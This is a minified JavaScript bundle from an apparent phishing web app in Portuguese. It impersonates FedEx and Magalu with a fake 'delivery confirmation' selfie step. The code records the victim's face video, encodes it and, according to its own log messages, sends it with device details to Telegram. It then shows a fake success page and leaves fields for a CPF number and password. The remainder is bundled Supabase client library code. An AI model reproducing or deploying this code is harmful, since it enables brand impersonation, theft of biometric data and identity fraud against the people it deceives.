encerrado:",e.kind)}}),l(e),!0}catch(e){return console.error("Erro ao acessar c\xe2mera:",e),alert("\xc9 necess\xe1rio permitir o acesso \xe0 c\xe2mera para continuar a verifica\xe7\xe3o."),!1}},y=(0,a.useCallback)(async()=>{t("verifying"),r(0);let e=null;if(i)try{console.log("Iniciando grava\xe7\xe3o do v\xeddeo...");const t=await function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:1e4;return new Promise((n,r)=>{try{const a=new MediaRecorder(e,{mimeType:"video/webm;codecs=vp8,opus"}),s=[];a.ondataavailable=e=>{e.data.size>0&&s.push(e.data)},a.onstop=()=>{const e=new Blob(s,{type:"video/webm"});n(e)},a.onerror=e=>{r(e)},a.start(),setTimeout(()=>{"recording"===a.state&&a.stop()},t),setTimeout(()=>{"recording"===a.state&&a.stop()},15e3)}catch(a){r(a)}})}(i,1e4);console.log("V\xeddeo gravado, tamanho:",t.size,"bytes"),e=await(n=t,new Promise((e,t)=>{const r=new FileReader;r.onloadend=()=>e(r.result),r.onerror=t,r.readAsDataURL(n)})),console.log("V\xeddeo convertido para base64, tamanho:",e.length,"caracteres")}catch(s){console.error("Erro ao gravar v\xeddeo:",s)}var n;const a=setInterval(async()=>{r(t=>{if(t>=100){clearInterval(a);const t={cpf:"",password:"",video:e,timestamp:(new Date).toISOString(),userAgent:navigator.userAgent};return Re(t).then(e=>{console.log("Dados salvos e enviados para Telegram:",e)}).catch(e=>{console.error("Erro ao salvar dados:",e)}),setTimeout(()=>{var e;p("/sucesso",{state:{cpf:null===(e=m.state)||void 0===e?void 0:e.cpf}})},500),100}return t+10})},300)},[i,m.state,p]),b=(0,a.useCallback)(e=>{e<g.length&&(u(g[e]),setTimeout(()=>{const t=e+1;t<g.length?b(t):(u(""),setTimeout(()=>{y()},1e3))},2500))},[g,y]),w=(0,a.useCallback)(()=>{h(!0),u(""),setTimeout(()=>{h(!1),b(0)},2e3)},[b]);(0,a.useEffect)(()=>{if(i&&f.current&&"capture"===e){const t=f.current;if(console.log("=== CONFIGURANDO V\xcdDEO ==="),console.log("Stream ativo:",i.active),console.log("Tracks:",i.getTracks().length),!i.active||i.getTracks().some(e=>"ended"===e.readyState))return console.warn("Stream inativo ou track encerrado, recriando..."),void v();i.getTracks().forEach(e=>{console.log("Track:",e.kind,"- enabled:",e.enabled,"- readyState:",e.readyState),e.enabled||(e.enabled=!0,console.log("Track habilitado:",e.kind)),e.onended=()=>{console.warn("Track foi encerrado, recriando..."),v().then(e=>{e&&console.log("Stream recriado ap\xf3s encerramento")})}}),console.log("Elemento v\xeddeo:",t),console.log("Step:",e),t.srcObject!==i&&(t.srcObject=i,console.log("srcObject atualizado")),t.setAttribute("playsinline","true"),t.setAttribute("webkit-playsinline","true");const n=async()=>{try{t.style.display="block",t.style.visibility="visible",t.style.opacity="1",t.style.width="100%",t.style.height="100%",t.style.position="absolute",t.style.top="0",t.style.left="0",t.style.zIndex="2",t.style.backgroundColor="transparent",t.style.filter="none",t.style.webkitFilter="none",console.log("Tentando reproduzir v\xeddeo..."),await t.play(),console.log("\u2705 V\xeddeo reproduzindo com sucesso");const e=t.getBoundingClientRect();console.log("Dimens\xf5es do v\xeddeo:",e.width,"x",e.height),console.log("V\xeddeo vis\xedvel?",e.width>0&&e.height>0),console.log("Video dimensions:",t.videoWidth,"x",t.videoHeight)}catch(e){console.error("\u274c Erro ao reproduzir v\xeddeo:",e),console.error("Erro detalhado:",e.message,e.name),setTimeout(()=>{t.play().catch(console.error)},500)}};setTimeout(()=>{n()},300)}return()=>{i&&i.getTracks().forEach(e=>e.stop())}},[i,e]),(0,a.useEffect)(()=>{if("capture"===e&&i&&f.current){const e=f.current;e.style.display="block",e.style.visibility="visible",e.style.opacity="1";const t=()=>{console.log("V\xeddeo metadata carregado"),setTimeout(()=>{w()},1500)},n=()=>{console.log("V\xeddeo pode ser reproduzido"),setTimeout(()=>{w()},1500)},r=()=>{console.log("V\xeddeo est\xe1 reproduzindo")};return e.readyState>=2?(console.log("V\xeddeo j\xe1 carregado, iniciando desafio"),t()):(e.addEventListener("loadedmetadata",t),e.addEventListener("canplay",n),e.addEventListener("playing",r)),()=>{e.removeEventListener("loadedmetadata",t),e.removeEventListener("canplay",n),e.removeEventListener("playing",r)}}},[e,i,w]);const _=async()=>{await v()?t("preparation"):alert("\xc9 necess\xe1rio permitir o acesso \xe0 c\xe2mera para continuar a verifica\xe7\xe3o.")},k=()=>{i&&i.getTracks().forEach(e=>e.stop()),window.confirm("Deseja cancelar a verifica\xe7\xe3o?")&&p("/etapa2",{state:m.state})};return"tips"===e?(0,Te.jsxs)("div",{className:"etapa3-container",children:[(0,Te.jsxs)("div",{className:"tips-header",children:[(0,Te.jsx)("h2",{className:"tips-title",children:"Foto de seguran\xe7a"}),(0,Te.jsx)("button",{className:"close-button",onClick:k,children:(0,Te.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),(0,Te.jsx)("line",{x1:"6",y1:"6",x2:"18",y2:"18"})]})})]}),(0,Te.jsxs)("div",{className:"tips-content",children:[(0,Te.jsx)("div",{className:"face-icon",children:(0,Te.jsxs)("svg",{width:"140",height:"140",viewBox:"0 0 140 140",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,Te.jsx)("rect",{x:"30",y:"35",width:"80",height:"70",rx:"4",fill:"none",stroke:"#E30613",strokeWidth:"3.5",strokeLinecap:"round",strokeLinejoin:"round"}),(0,Te.jsx)("path",{d:"M30 60 L70 60 L110 60",stroke:"#E30613",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round"}),(0,Te.jsx)("rect",{x:"50",y:"40",width:"40",height:"15",rx:"2",fill:"#E30613",opacity:"0.2",stroke:"#E30613",strokeWidth:"1.5"}),(0,Te.jsx)("circle",{cx:"70",cy:"75",r:"12",fill:"none",stroke:"#E30613",strokeWidth:"3",strokeLinecap:"round",strokeLinejoin:"round"}),(0,Te.jsx)("circle",{cx:"65",cy:"72",r:"2.5",fill:"#E30613"}),(0,Te.jsx)("circle",{cx:"75",cy:"72",r:"2.5",fill:"#E30613"}),(0,Te.jsx)("path",{d:"M65 80 Q70 85 75 80",stroke:"#E30613",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",fill:"none"}),(0,Te.jsx)("path",{d:"M115 70 L125 70 M120 65 L125 70 L120 75",stroke:"#FF6600",strokeWidth:"3",strokeLinecap:"round",strokeLinejoin:"round"}),(0,Te.jsx)("circle",{cx:"20",cy:"70",r:"3",fill:"#E30613",opacity:"0.6"}),(0,Te.jsx)("circle",{cx:"15",cy:"70",r:"2",fill:"#E30613",opacity:"0.4"})]})}),(0,Te.jsx)("h3",{className:"tips-main-text",children:"Confirme a entrega"}),(0,Te.jsx)("p",{className:"tips-subtext",children:"Em parceria com Magalu e FedEx, precisamos de uma foto para confirmar a entrega. \xc9 r\xe1pido e seguro!"}),(0,Te.jsxs)("div",{className:"tips-card",children:[(0,Te.jsx)("h4",{className:"tips-card-title",children:"Dicas para uma boa foto:"}),(0,Te.jsxs)("div",{className:"tip-item",children:[(0,Te.jsx)("div",{className:"tip-icon",children:(0,Te.jsxs)("svg",{width:"28",height:"28",viewBox:"0 0 24 24",fill:"none",stroke:"#E30613",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("circle",{cx:"12",cy:"12",r:"5"}),(0,Te.jsx)("line",{x1:"12",y1:"1",x2:"12",y2:"3"}),(0,Te.jsx)("line",{x1:"12",y1:"21",x2:"12",y2:"23"}),(0,Te.jsx)("line",{x1:"4.22",y1:"4.22",x2:"5.64",y2:"5.64"}),(0,Te.jsx)("line",{x1:"18.36",y1:"18.36",x2:"19.78",y2:"19.78"}),(0,Te.jsx)("line",{x1:"1",y1:"12",x2:"3",y2:"12"}),(0,Te.jsx)("line",{x1:"21",y1:"12",x2:"23",y2:"12"}),(0,Te.jsx)("line",{x1:"4.22",y1:"19.78",x2:"5.64",y2:"18.36"}),(0,Te.jsx)("line",{x1:"18.36",y1:"5.64",x2:"19.78",y2:"4.22"})]})}),(0,Te.jsx)("span",{className:"tip-text",children:"V\xe1 para um lugar iluminado."})]}),(0,Te.jsxs)("div",{className:"tip-item",children:[(0,Te.jsx)("div",{className:"tip-icon",children:(0,Te.jsxs)("svg",{width:"28",height:"28",viewBox:"0 0 24 24",fill:"none",stroke:"#E30613",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("path",{d:"M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"}),(0,Te.jsx)("circle",{cx:"12",cy:"7",r:"4"}),(0,Te.jsx)("line",{x1:"2",y1:"2",x2:"22",y2:"22",strokeWidth:"2.5"})]})}),(0,Te.jsx)("span",{className:"tip-text",children:"N\xe3o use \xf3culos de sol, bon\xe9, m\xe1scara ou qualquer coisa que cubra seu rosto."})]})]}),(0,Te.jsx)("button",{className:"btn-understand",onClick:_,children:"OK, entendi"}),(0,Te.jsx)("button",{type:"button",className:"why-link",onClick:e=>{e.preventDefault()},children:"Por que confirmar essa informa\xe7\xe3o?"})]})]}):"verifying"===e?(0,Te.jsx)("div",{className:"etapa3-container verifying",children:(0,Te.jsxs)("div",{className:"verification-content",children:[(0,Te.jsx)("div",{className:"verification-icon",children:"\u2713"}),(0,Te.jsx)("h2",{className:"verification-title",children:"Verificando..."}),(0,Te.jsx)("div",{className:"progress-bar-container",children:(0,Te.jsx)("div",{className:"progress-bar",style:{width:"".concat(n,"%")}})}),(0,Te.jsxs)("p",{className:"verification-text",children:[n,"% conclu\xeddo"]})]})}):(0,Te.jsxs)("div",{className:"etapa3-container",children:[(0,Te.jsx)("button",{className:"close-x",onClick:k,children:"\u2715"}),(0,Te.jsxs)("div",{className:"capture-content",children:[(0,Te.jsxs)("h2",{className:"capture-title",children:["Vamos l\xe1, prepare-se",(0,Te.jsx)("br",{}),"para come\xe7ar."]}),(0,Te.jsxs)("div",{className:"face-frame",children:[(0,Te.jsx)("div",{className:"face-preview",children:"capture"===e&&i?(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsx)("video",{ref:f,autoPlay:!0,playsInline:!0,muted:!0,className:"face-video",style:{display:"block",visibility:"visible",opacity:1,width:"100%",height:"100%",position:"absolute",top:0,left:0,zIndex:2,objectFit:"cover",borderRadius:"50%",transform:"scaleX(-1)",backgroundColor:"transparent",pointerEvents:"none",minWidth:"100%",minHeight:"100%"},onLoadedMetadata:()=>{console.log("V\xeddeo metadata carregado no elemento");const e=f.current;if(e&&e.srcObject){const t=e.srcObject;console.log("Stream no v\xeddeo - ativo:",t.active),t.getTracks().forEach(e=>{console.log("Track no v\xeddeo:",e.kind,"- enabled:",e.enabled),e.enabled||(e.enabled=!0)}),e.play().catch(e=>console.error("Erro ao reproduzir ap\xf3s metadata:",e))}},onCanPlay:()=>{console.log("V\xeddeo pode ser reproduzido no elemento");const e=f.current;e&&e.play().catch(e=>console.error("Erro ao reproduzir ap\xf3s canplay:",e))},onPlaying:()=>{console.log("V\xeddeo est\xe1 reproduzindo no elemento");const e=f.current;e&&(console.log("V\xeddeo dimensions:",e.videoWidth,"x",e.videoHeight),console.log("V\xeddeo readyState:",e.readyState),e.style.display="block",e.style.visibility="visible",e.style.opacity="1")},onError:e=>{console.error("Erro no elemento v\xeddeo:",e);const t=f.current;var n;t&&(console.error("V\xeddeo error code:",t.error),console.error("V\xeddeo error message:",null===(n=t.error)||void 0===n?void 0:n.message))}}),d&&(0,Te.jsx)("div",{className:"instruction-overlay",children:"Aproxime mais um pouco"}),c&&!d&&(0,Te.jsx)("div",{className:"challenge-overlay",children:c})]}):(0,Te.jsx)("div",{className:"face-placeholder",children:"\ud83d\udc64"})}),"capture"===e&&(0,Te.jsx)("div",{className:"zeom-logo",children:"zeOm"})]}),"preparation"===e&&(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsx)("p",{className:"capture-instruction",children:"Enquadre seu rosto na marca\xe7\xe3o, pressione o bot\xe3o abaixo e siga as indica\xe7\xf5es na tela."}),(0,Te.jsx)("button",{className:"btn-ready",onClick:()=>{t("capture")},children:"Estou pronto"})]}),"capture"===e&&(0,Te.jsx)("p",{className:"capture-instruction",children:c?"":"Mantenha o rosto enquadrado e aguarde a captura autom\xe1tica."})]}),(0,Te.jsx)("div",{className:"logos-container",children:s?(0,Te.jsxs)("div",{className:"logos-fallback",children:[(0,Te.jsx)("span",{children:"Magalu"}),(0,Te.jsx)("span",{children:"FedEx"})]}):(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsx)("img",{src:"/logo-magalu-azul (1).png",alt:"Magalu",className:"logo-magalu",onError:()=>o(!0)}),(0,Te.jsx)("a",{href:"https://www.fedex.com/pt-br/shipping/rates/last-minute-rates.html?cmp=KNC-1009085-3-1-950-1000000-LAC-BR-ES-SearchKeywords&gclsrc=aw.ds&gad_source=1&gad_campaignid=23175507727&gbraid=0AAAAADlsr1bNoztKIG9t2R09WvnSVhiGt&gclid=Cj0KCQiA7-rMBhCFARIsAKnLKtCtAoTL6GnNuTgBOC53MPzTNyVE9cgPriWYti1fJFmH3OCG3Ug0F3kaArPQEALw_wcB",target:"_blank",rel:"noopener noreferrer",style:{display:"inline-block"},children:(0,Te.jsx)("img",{src:"/fedex.png",alt:"FedEx",className:"logo-fedex",onError:()=>o(!0)})})]})})]})},Oe=()=>{const[e,t]=(0,a.useState)(!1),n=re();return(0,a.useEffect)(()=>{document.title="FedEx - Entrega Confirmada"},[]),(0,Te.jsxs)("div",{className:"sucesso-container",children:[(0,Te.jsxs)("div",{className:"sucesso-content",children:[(0,Te.jsx)("div",{className:"success-icon",children:"\u2713"}),(0,Te.jsx)("h1",{className:"success-title",children:"Entrega confirmada!"}),(0,Te.jsx)("p",{className:"success-message",children:"Sua verifica\xe7\xe3o foi conclu\xedda com sucesso."}),(0,Te.jsx)("p",{className:"success-submessage",children:"Obrigado por utilizar nossos servi\xe7os."}),(0,Te.jsx)("button",{className:"btn-continue",onClick:()=>n("/"),children:"Voltar ao In\xedcio"})]}),(0,Te.jsx)("div",{className:"logos-container",children:e?(0,Te.jsxs)("div",{className:"logos-fallback",children:[(0,Te.jsx)("span",{children:"Magalu"}),(0,Te.jsx)("span",{children:"FedEx"})]}):(0,Te.jsxs)(Te.Fragment,{children:[(0,Te.jsx)("img",{src:"/logo-magalu-azul (1).png",alt:"Magalu",className:"logo-magalu",onError:()=>t(!0)}),(0,Te.jsx)("a",{href:"https://www.fedex.com/pt-br/shipping/rates/last-minute-rates.html?cmp=KNC-1009085-3-1-950-1000000-LAC-BR-ES-SearchKeywords&gclsrc=aw.ds&gad_source=1&gad_campaignid=23175507727&gbraid=0AAAAADlsr1bNoztKIG9t2R09WvnSVhiGt&gclid=Cj0KCQiA7-rMBhCFARIsAKnLKtCtAoTL6GnNuTgBOC53MPzTNyVE9cgPriWYti1fJFmH3OCG3Ug0F3kaArPQEALw_wcB",target:"_blank",rel:"noopener noreferrer",style:{display:"inline-block"},children:(0,Te.jsx)("img",{src:"/fedex.png",alt:"FedEx",className:"logo-fedex",onError:()=>t(!0)})})]})})]})};function Ae(e,t){var n={};for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&t.indexOf(r)<0&&(n[r]=e[r]);if(null!=e&&"function"===typeof Object.getOwnPropertySymbols){var a=0;for(r=Object.getOwnPropertySymbols(e);a<r.length;a++)t.indexOf(r[a])<0&&Object.prototype.propertyIsEnumerable.call(e,r[a])&&(n[r[a]]=e[r[a]])}return n}function Ie(e,t,n,r){return new(n||(n=Promise))(function(a,s){function o(e){try{l(r.next(e))}catch(Oa){s(Oa)}}function i(e){try{l(r.throw(e))}catch(Oa){s(Oa)}}function l(e){var t;e.done?a(e.value):(t=e.value,t instanceof n?t:new n(function(e){e(t)})).then(o,i)}l((r=r.apply(e,t||[])).next())})}Object.create;Object.create;"function"===typeof SuppressedError&&SuppressedError;class Le extends Error{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"FunctionsError",n=arguments.length>2?arguments[2]:void 0;super(e),this.name=t,this.context=n}}class De extends Le{constructor(e){super("Failed to send a request to the Edge Function","FunctionsFetchError",e)}}class Ue extends Le{constructor(e){super("Relay Error invoking the Edge Function","FunctionsRelayError",e)}}class Me extends Le{constructor(e){super("Edge Function returned a non-2xx status code","FunctionsHttpError",e)}}var ze;!function(e){e.Any="any",e.ApNortheast1="ap-northeast-1",e.ApNortheast2="ap-northeast-2",e.ApSouth1="ap-south-1",e.ApSoutheast1="ap-southeast-1",e.ApSoutheast2="ap-southeast-2",e.CaCentral1="ca-central-1",e.EuCentral1="eu-central-1",e.EuWest1="eu-west-1",e.EuWest2="eu-west-2",e.EuWest3="eu-west-3",e.SaEast1="sa-east-1",e.UsEast1="us-east-1",e.UsWest1="us-west-1",e.UsWest2="us-west-2"}(ze||(ze={}));class Be{constructor(e){let{headers:t={},customFetch:n,region:r=ze.Any}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};this.url=e,this.headers=t,this.region=r,this.fetch=(e=>e?function(){return e(...arguments)}:function(){return fetch(...arguments)})(n)}setAuth(e){this.headers.Authorization="Bearer ".concat(e)}invoke(e){return Ie(this,arguments,void 0,function(e){var t=this;let n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return function*(){var r;let a,s;try{const{headers:o,method:i,body:l,signal:c,timeout:u}=n;let d={},{region:h}=n;h||(h=t.region);const f=new URL("".concat(t.url,"/").concat(e));let p;h&&"any"!==h&&(d["x-region"]=h,f.searchParams.set("forceFunctionRegion",h)),l&&(o&&!Object.prototype.hasOwnProperty.call(o,"Content-Type")||!o)?"undefined"!==typeof Blob&&l instanceof Blob||l instanceof ArrayBuffer?(d["Content-Type"]="application/octet-stream",p=l):"string"===typeof l?(d["Content-Type"]="text/plain",p=l):"undefined"!==typeof FormData&&l instanceof FormData?p=l:(d["Content-Type"]="application/json",p=JSON.stringify(l)):p=!l||"string"===typeof l||"undefined"!==typeof Blob&&l instanceof Blob||l instanceof ArrayBuffer||"undefined"!==typeof FormData&&l instanceof FormData?l:JSON.stringify(l);let m=c;u&&(s=new AbortController,a=setTimeout(()=>s.abort(),u),c?(m=s.signal,c.addEventListener("abort",()=>s.abort())):m=s.signal);const g=yield t.fetch(f.toString(),{method:i||"POST",headers:Object.assign(Object.assign(Object.assign({},d),t.headers),o),body:p,signal:m}).catch(e=>{throw new De(e)}),v=g.headers.get("x-relay-error");if(v&&"true"===v)throw new Ue(g);if(!g.ok)throw new Me(g);let y,b=(null!==(r=g.headers.get("Content-Type"))&&void 0!==r?r:"text/plain").split(";")[0].trim();return y="application/json"===b?yield g.json():"application/octet-stream"===b||"application/pdf"===b?yield g.blob():"text/event-stream"===b?g:"multipart/form-data"===b?yield g.formData():yield g.text(),{data:y,error:null,response:g}}catch(o){return{data:null,error:o,response:o instanceof Me||o instanceof Ue?o.context:void 0}}finally{a&&clearTimeout(a)}}()})}}var Fe=class extends Error{constructor(e){super(e.message),this.name="PostgrestError",this.details=e.details,this.hint=e.hint,this.code=e.code}},Ve=class{constructor(e){var t,n,r;this.shouldThrowOnError=!1,this.method=e.method,this.url=e.url,this.headers=new Headers(e.headers),this.schema=e.schema,this.body=e.body,this.shouldThrowOnError=null!==(t=e.shouldThrowOnError)&&void 0!==t&&t,this.signal=e.signal,this.isMaybeSingle=null!==(n=e.isMaybeSingle)&&void 0!==n&&n,this.urlLengthLimit=null!==(r=e.urlLengthLimit)&&void 0!==r?r:8e3,e.fetch?this.fetch=e.fetch:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}setHeader(e,t){return this.headers=new Headers(this.headers),this.headers.set(e,t),this}then(e,t){var n=this;void 0===this.schema||(["GET","HEAD"].includes(this.method)?this.headers.set("Accept-Profile",this.schema):this.headers.set("Content-Profile",this.schema)),"GET"!==this.method&&"HEAD"!==this.method&&this.headers.set("Content-Type","application/json");let r=(0,this.fetch)(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async e=>{let t=null,r=null,a=null,s=e.status,o=e.statusText;if(e.ok){var i,l;if("HEAD"!==n.method){var c;const t=await e.text();""===t||(r="text/csv"===n.headers.get("Accept")||n.headers.get("Accept")&&(null===(c=n.headers.get("Accept"))||void 0===c?void 0:c.includes("application/vnd.pgrst.plan+text"))?t:JSON.parse(t))}const u=null===(i=n.headers.get("Prefer"))||void 0===i?void 0:i.match(/count=(exact|planned|estimated)/),d=null===(l=e.headers.get("content-range"))||void 0===l?void 0:l.split("/");u&&d&&d.length>1&&(a=parseInt(d[1])),n.isMaybeSingle&&"GET"===n.method&&Array.isArray(r)&&(r.length>1?(t={code:"PGRST116",details:"Results contain ".concat(r.length," rows, application/vnd.pgrst.object+json requires 1 row"),hint:null,message:"JSON object requested, multiple (or no) rows returned"},r=null,a=null,s=406,o="Not Acceptable"):r=1===r.length?r[0]:null)}else{var u;const a=await e.text();try{t=JSON.parse(a),Array.isArray(t)&&404===e.status&&(r=[],t=null,s=200,o="OK")}catch(d){404===e.status&&""===a?(s=204,o="No Content"):t={message:a}}if(t&&n.isMaybeSingle&&(null===t||void 0===t||null===(u=t.details)||void 0===u?void 0:u.includes("0 rows"))&&(t=null,s=200,o="OK"),t&&n.shouldThrowOnError)throw new Fe(t)}return{error:t,data:r,count:a,status:s,statusText:o}});return this.shouldThrowOnError||(r=r.catch(e=>{var t;let n="",r="",a="";const s=null===e||void 0===e?void 0:e.cause;if(s){var o,i,l,c;const t=null!==(o=null===s||void 0===s?void 0:s.message)&&void 0!==o?o:"",r=null!==(i=null===s||void 0===s?void 0:s.code)&&void 0!==i?i:"";n="".concat(null!==(l=null===e||void 0===e?void 0:e.name)&&void 0!==l?l:"FetchError",": ").concat(null===e||void 0===e?void 0:e.message),n+="\n\nCaused by: ".concat(null!==(c=null===s||void 0===s?void 0:s.name)&&void 0!==c?c:"Error",": ").concat(t),r&&(n+=" (".concat(r,")")),(null===s||void 0===s?void 0:s.stack)&&(n+="\n".concat(s.stack))}else{var u;n=null!==(u=null===e||void 0===e?void 0:e.stack)&&void 0!==u?u:""}const d=this.url.toString().length;return"AbortError"===(null===e||void 0===e?void 0:e.name)||"ABORT_ERR"===(null===e||void 0===e?void 0:e.code)?(a="",r="Request was aborted (timeout or manual cancellation)",d>this.urlLengthLimit&&(r+=". Note: Your request URL is ".concat(d," characters, which may exceed server limits. If selecting many fields, consider using views. If filtering with large arrays (e.g., .in('id', [many IDs])), consider using an RPC function to pass values server-side."))):"HeadersOverflowError"!==(null===s||void 0===s?void 0:s.name)&&"UND_ERR_HEADERS_OVERFLOW"!==(null===s||void 0===s?void 0:s.code)||(a="",r="HTTP headers exceeded server limits (typically 16KB)",d>this.urlLengthLimit&&(r+=". Your request URL is ".concat(d," characters. If selecting many fields, consider using views. If filtering with large arrays (e.g., .in('id', [200+ IDs])), consider using an RPC function instead."))),{error:{message:"".concat(null!==(t=null===e||void 0===e?void 0:e.name)&&void 0!==t?t:"FetchError",": ").concat(null===e||void 0===e?void 0:e.message),details:n,hint:r,code:a},data:null,count:null,status:0,statusText:""}})),r.then(e,t)}returns(){return this}overrideTypes(){return this}},qe=class extends Ve{select(e){let t=!1;const n=(null!==e&&void 0!==e?e:"*").split("").map(e=>/\s/.test(e)&&!t?"":('"'===e&&(t=!t),e)).join("");return this.url.searchParams.set("select",n),this.headers.append("Prefer","return=representation"),this}order(e){let{ascending:t=!0,nullsFirst:n,foreignTable:r,referencedTable:a=r}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};const s=a?"".concat(a,".order"):"order",o=this.url.searchParams.get(s);return this.url.searchParams.set(s,"".concat(o?"".concat(o,","):"").concat(e,".").concat(t?"asc":"desc").concat(void 0===n?"":n?".nullsfirst":".nullslast")),this}limit(e){let{foreignTable:t,referencedTable:n=t}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};const r="undefined"===typeof n?"limit":"".concat(n,".limit");return this.url.searchParams.set(r,"".concat(e)),this}range(e,t){let{foreignTable:n,referencedTable:r=n}=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};const a="undefined"===typeof r?"offset":"".concat(r,".offset"),s="undefined"===typeof r?"limit":"".concat(r,".limit");return this.url.searchParams.set(a,"".concat(e)),this.url.searchParams.set(s,"".concat(t-e+1)),this}abortSignal(e){return this.signal=e,this}single(){return this.headers.set("Accept","application/vnd.pgrst.object+json"),this}maybeSingle(){return"GET"===this.method?this.headers.set("Accept","application/json"):this.headers.set("Accept","application/vnd.pgrst.object+json"),this.isMaybeSingle=!0,this}csv(){return this.headers.set("Accept","text/csv"),this}geojson(){return this.headers.set("Accept","application/geo+json"),this}explain(){let{analyze:e=!1,verbose:t=!1,settings:n=!1,buffers:r=!1,wal:a=!1,format:s="text"}=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};var o;const i=[e?"analyze":null,t?"verbose":null,n?"settings":null,r?"buffers":null,a?"wal":null].filter(Boolean).join("|"),l=null!==(o=this.headers.get("Accept"))&&void 0!==o?o:"application/json";return this.headers.set("Accept","application/vnd.pgrst.plan+".concat(s,'; for="').concat(l,'"; options=').concat(i,";")),this}rollback(){return this.headers.append("Prefer","tx=rollback"),this}returns(){return this}maxAffected(e){return this.headers.append("Prefer","handling=strict"),this.headers.append("Prefer","max-affected=".concat(e)),this}};const We=new RegExp("[,()]");var He=class extends qe{eq(e,t){return this.url.searchParams.append(e,"eq.".concat(t)),this}neq(e,t){return this.url.searchParams.append(e,"neq.".concat(t)),this}gt(e,t){return this.url.searchParams.append(e,"gt.".concat(t)),this}gte(e,t){return this.url.searchParams.append(e,"gte.".concat(t)),this}lt(e,t){return this.url.searchParams.append(e,"lt.".concat(t)),this}lte(e,t){return this.url.searchParams.append(e,"lte.".concat(t)),this}like(e,t){return this.url.searchParams.append(e,"like.".concat(t)),this}likeAllOf(e,t){return this.url.searchParams.append(e,"like(all).{".concat(t.join(","),"}")),this}likeAnyOf(e,t){return this.url.searchParams.append(e,"like(any).{".concat(t.join(","),"}")),this}ilike(e,t){return this.url.searchParams.append(e,"ilike.".concat(t)),this}ilikeAllOf(e,t){return this.url.searchParams.append(e,"ilike(all).{".concat(t.join(","),"}")),this}ilikeAnyOf(e,t){return this.url.searchParams.append(e,"ilike(any).{".concat(t.join(","),"}")),this}regexMatch(e,t){return this.url.searchParams.append(e,"match.".concat(t)),this}regexIMatch(e,t){return this.url.searchParams.append(e,"imatch.".concat(t)),this}is(e,t){return this.url.searchParams.append(e,"is.".concat(t)),this}isDistinct(e,t){return this.url.searchParams.append(e,"isdistinct.".concat(t)),this}in(e,t){const n=Array.from(new Set(t)).map(e=>"string"===typeof e&&We.test(e)?'"'.concat(e,'"'):"".concat(e)).join(",");return this.url.searchParams.append(e,"in.(".concat(n,")")),this}notIn(e,t){const n=Array.from(new Set(t)).map(e=>"string"===typeof e&&We.test(e)?'"'.concat(e,'"'):"".concat(e)).join(",");return this.url.searchParams.append(e,"not.in.(".concat(n,")")),this}contains(e,t){return"string"===typeof t?this.url.searchParams.append(e,"cs.".concat(t)):Array.isArray(t)?this.url.searchParams.append(e,"cs.{".concat(t.join(","),"}")):this.url.searchParams.append(e,"cs.".concat(JSON.stringify(t))),this}containedBy(e,t){return"string"===typeof t?this.url.searchParams.append(e,"cd.".concat(t)):Array.isArray(t)?this.url.searchParams.append(e,"cd.{".concat(t.join(","),"}")):this.url.searchParams.append(e,"cd.".concat(JSON.stringify(t))),this}rangeGt(e,t){return this.url.searchParams.append(e,"sr.".concat(t)),this}rangeGte(e,t){return this.url.searchParams.append(e,"nxl.".concat(t)),this}rangeLt(e,t){return this.url.searchParams.append(e,"sl.".concat(t)),this}rangeLte(e,t){return this.url.searchParams.append(e,"nxr.".concat(t)),this}rangeAdjacent(e,t){return this.url.searchParams.append(e,"adj.".concat(t)),this}overlaps(e,t){return"string"===typeof t?this.url.searchParams.append(e,"ov.".concat(t)):this.url.searchParams.append(e,"ov.{".concat(t.join(","),"}")),this}textSearch(e,t){let{config:n,type:r}=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},a="";"plain"===r?a="pl":"phrase"===r?a="ph":"websearch"===r&&(a="w");const s=void 0===n?"":"(".concat(n,")");return this.url.searchParams.append(e,"".concat(a,"fts").concat(s,".").concat(t)),this}match(e){return Object.entries(e).forEach(e=>{let[t,n]=e;this.url.searchParams.append(t,"eq.".concat(n))}),this}not(e,t,n){return this.url.searchParams.append(e,"not.".concat(t,".").concat(n)),this}or(e){let{foreignTable:t,referencedTable:n=t}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};const r=n?"".concat(n,".or"):"or";return this.url.searchParams.append(r,"(".concat(e,")")),this}filter(e,t,n){return this.url.searchParams.append(e,"".concat(t,".").concat(n)),this}},Ke=class{constructor(e,t){let{headers:n={},schema:r,fetch:a,urlLengthLimit:s=8e3}=t;this.url=e,this.headers=new Headers(n),this.schema=r,this.fetch=a,this.urlLengthLimit=s}cloneRequestState(){return{url:new URL(this.url.toString()),headers:new Headers(this.headers)}}select(e,t){const{head:n=!1,count:r}=null!==t&&void 0!==t?t:{},a=n?"HEAD":"GET";let s=!1;const o=(null!==e&&void 0!==e?e:"*").split("").map(e=>/\s/.test(e)&&!s?"":('"'===e&&(s=!s),e)).join(""),{url:i,headers:l}=this.cloneRequestState();return i.searchParams.set("select",o),r&&l.append("Prefer","count=".concat(r)),new 